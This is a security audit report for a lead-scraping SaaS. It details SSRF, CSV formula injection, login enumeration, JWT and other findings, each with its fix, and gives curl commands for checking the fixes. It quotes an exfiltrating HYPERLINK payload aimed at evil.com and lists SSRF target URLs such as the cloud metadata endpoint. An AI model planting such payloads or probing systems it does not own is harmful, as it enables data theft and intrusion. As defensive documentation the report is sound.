# BridgeLeads — Security Audit Report

**Risk posture before fixes:** MEDIUM-HIGH
**Risk posture after fixes:** LOW-MEDIUM

---

## Audit Scope and Methodology

Full application security audit covering API, authentication, scraping workers, data export, and infrastructure. Methodology: manual code review + threat modeling across OWASP Top 10 + attack surface analysis specific to multi-tenant SaaS with outbound HTTP workers.

---

## Attack Surface Map

Two facts define BridgeLeads's primary attack surface:

1. **Multi-tenant data** — a bug leaking one user's leads to another is a company-ending event
2. **Outbound HTTP from workers** — if an attacker controls scrape targets, they can use BridgeLeads workers as a proxy to attack internal infrastructure (SSRF)

---

## Findings

### CRITICAL

#### VULN-001 — SSRF: Workers Could Attack Internal Infrastructure
**Severity:** CRITICAL | **CVSS:** 9.1 | **File:** `src/scrapers/base.py`

Playwright `navigate()` and `requests` session accepted any URL without validation. A malicious user could supply a URL pointing at `http://169.254.169.254/` (AWS metadata), `http://10.0.0.1/` (internal network), or `http://redis:6379/` — giving full internal service access from the worker network.

**Fix:** `src/api/middleware/security.py` — `validate_scraping_target()` checks URLs against an explicit HTTPS-only allowlist of approved county portal domains. RFC1918 ranges, link-local, loopback, and cloud metadata hostnames blocked explicitly. New county portals require explicit allowlist addition.

#### VULN-002 — CSV Injection (Formula Injection)
**Severity:** HIGH | **CVSS:** 7.8 | **File:** `src/workers/exporter.py`

Scraped data was written to CSV without sanitization. An attacker could file a probate record with a party name of `=HYPERLINK("http://evil.com/steal?data="&A1)` — when Mike opens the CSV in Excel, this formula executes and exfiltrates data. This is a real-world attack: adversaries have filed fake public records containing injection payloads specifically targeting data aggregators.

**Fix:** `sanitize_for_csv()` prefixes any cell starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single quote. Applied to all fields before DataFrame construction.

---

### HIGH

#### VULN-003 — User Enumeration via Login Errors
**Severity:** HIGH | **CVSS:** 5.3 | **File:** `src/api/routes/auth.py`

Login returned different errors for "user not found" vs "wrong password". Registration returned "Email already registered" for duplicates. This allowed attackers to enumerate all registered emails — a prerequisite for credential stuffing.

**Fix:** Generic "Invalid credentials" for all auth failures. Registration returns generic "Registration failed". Login always runs `verify_password()` even when user doesn't exist (constant-time parity).

#### VULN-004 — No Brute Force Protection
**Severity:** HIGH | **CVSS:** 7.5 | **File:** `src/api/routes/auth.py`

No rate limiting or lockout on auth endpoints. Unlimited password guessing with no consequence.

**Fix:** `BruteForceProtection` with progressive lockout: 5 failures → 1 min, 10 → 5 min, 20 → 30 min, 50 → 24 hours. Tracks per-IP AND per-email (defeating distributed attacks). Returns `Retry-After` header on 429.

#### VULN-005 — No JWT Revocation / Logout
**Severity:** HIGH | **CVSS:** 6.5 | **File:** `src/api/routes/auth.py`

No logout endpoint existed. JWTs valid for 7 days with no revocation mechanism. A stolen token or compromised account had no remedy short of waiting a week.

**Fix:** `TokenBlacklist` Redis-backed blacklist. `POST /auth/logout` blacklists current JWT's `jti`. `POST /auth/logout-all` revokes all tokens for user via timestamp-based revocation. JWT now includes `jti`, `iss`, `aud`.

#### VULN-006 — JWT Missing Audience and Issuer Validation
**Severity:** MEDIUM-HIGH | **File:** `src/api/auth.py`

JWT decode did not validate `iss` or `aud` claims. A token issued for one service could be replayed against another.

**Fix:** `create_secure_token()` adds `iss: "proppulse"` and `aud: "proppulse-api"`. `decode_secure_token()` validates both via python-jose options.

---

### MEDIUM

#### VULN-007 — API Docs Exposed in Production
FastAPI's `/docs` and `/redoc` served in production by default — exposing full API schema as an attack map.

**Fix:** `docs_url=None` when `debug=False`.

#### VULN-008 — CORS Wildcard Methods and Headers
`allow_methods=["*"]` and `allow_headers=["*"]` too permissive.

**Fix:** Explicit allowlists for methods and headers.

#### VULN-009 — Timing Attack on API Key Lookup
Standard `==` comparison on API key hash leaked timing information enabling character-by-character inference.

**Fix:** `hmac.compare_digest()` in `constant_time_compare()`.

#### VULN-010 — Log Injection via Scraped Content
Raw scraped content written directly to log messages. A party name containing `\n[ERROR] Fake message` would inject fake log entries.

**Fix:** Strip control characters and newlines from all log messages before writing.

#### VULN-011 — ReDoS via Search Parameter
`%%%%%` wildcards in search parameter trigger catastrophic backtracking in PostgreSQL ILIKE.

**Fix:** 100-char length limit + escape SQL LIKE wildcards (`%` → `\%`, `_` → `\_`) in user input.

---

### LOW

#### VULN-012 — Secret Key Default Value
`SECRET_KEY` had a default `"changeme-in-production"` — forgotten env var = known signing key.

**Fix:** Pydantic validator raises if value is default or <32 chars.

#### VULN-013 — Celery Task ID Predictability
Task ID = database job UUID, visible in API responses. Anyone with job ID could interact with Celery directly via Flower.

**Fix:** Flower protected by HTTP Basic Auth. Additional: use separate non-guessable task ID.

---

## New Security Files Added

```
src/api/middleware/
  rate_limit.py         ← Redis sliding window rate limiter
  security.py           ← SSRF firewall, input sanitization, CSV injection prevention,
                           security headers middleware, audit logger
  auth_hardening.py     ← Token blacklist, brute force protection,
                           constant-time comparison, secure JWT creation
docs/
  security-audit.md     ← This file
```

---

## Security Controls Matrix

| Control | Status |
|---------|--------|
| JWT authentication | ✅ |
| API key authentication (Business+) | ✅ |
| Multi-tenant isolation (query + RLS) | ✅ |
| Brute force / lockout | ✅ Fixed |
| User enumeration prevention | ✅ Fixed |
| JWT revocation + logout | ✅ Fixed |
| JWT iss + aud + jti validation | ✅ Fixed |
| SSRF prevention | ✅ Fixed |
| CSV injection sanitization | ✅ Fixed |
| Log injection prevention | ✅ Fixed |
| Search ReDoS prevention | ✅ Fixed |
| Security response headers | ✅ Fixed |
| Sliding window rate limiting | ✅ Fixed |
| CORS explicit allowlists | ✅ Fixed |
| API docs hidden in production | ✅ Fixed |
| Audit logging (auth events) | ✅ Fixed |
| Timing attack (API key) | ✅ Fixed |
| Dependency scanning (Dependabot) | ✅ |
| All secrets via env vars | ✅ |
| HTTPS only, TLS 1.2/1.3, HSTS | ✅ |
| ChromeDriver supply chain | ⚠️ Open |
| robots.txt compliance | ⚠️ Open |
| Third-party penetration test | ⚠️ Pre-launch |

---

## Security Testing Commands

```bash
# SSRF protection
curl -X POST https://api.proppulse.io/scrapers \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"county": "evil", "base_url": "http://169.254.169.254/"}'
# Expected: 422 Unprocessable Entity

# Rate limiting
for i in {1..15}; do
  curl -X POST https://api.proppulse.io/auth/login \
    -d '{"email": "test@test.com", "password": "wrong"}'
done
# Expected: 429 after 10 attempts

# Cross-user data access
curl https://api.proppulse.io/jobs/$JOB_ID_USER_A \
  -H "Authorization: Bearer USER_B_TOKEN"
# Expected: 404

# JWT blacklist after logout
TOKEN=$(curl -X POST /auth/login ... | jq -r .access_token)
curl -X POST /auth/logout -H "Authorization: Bearer $TOKEN"
curl /auth/me -H "Authorization: Bearer $TOKEN"
# Expected: 401 after logout

# API docs not in production
curl https://api.proppulse.io/docs
# Expected: 404
```

---

## Threat Model

### Threat Actors

| Actor | Motivation | Capability |
|-------|-----------|------------|
| Competing SaaS | Steal customer data / disrupt service | Moderate |
| Automated scraper bots | Abuse free tier for data | Low-moderate |
| Disgruntled customer | Access other users' leads | Low |
| External attacker | SSRF to access cloud metadata, pivot to infrastructure | High |
| Malicious public record filer | CSV injection, XSS via scraped content | Low |

### Highest-Risk Scenarios

1. **Worker compromise via SSRF** — attacker gains AWS IAM credentials via metadata endpoint — now FIXED
2. **Multi-tenant data leak** — missing `user_id` filter returns another user's leads — mitigated by RLS
3. **Credential stuffing** — enumerated emails + known password lists — now FIXED
4. **CSV malware delivery** — scraped record triggers Excel formula execution on Mike's machine — now FIXED
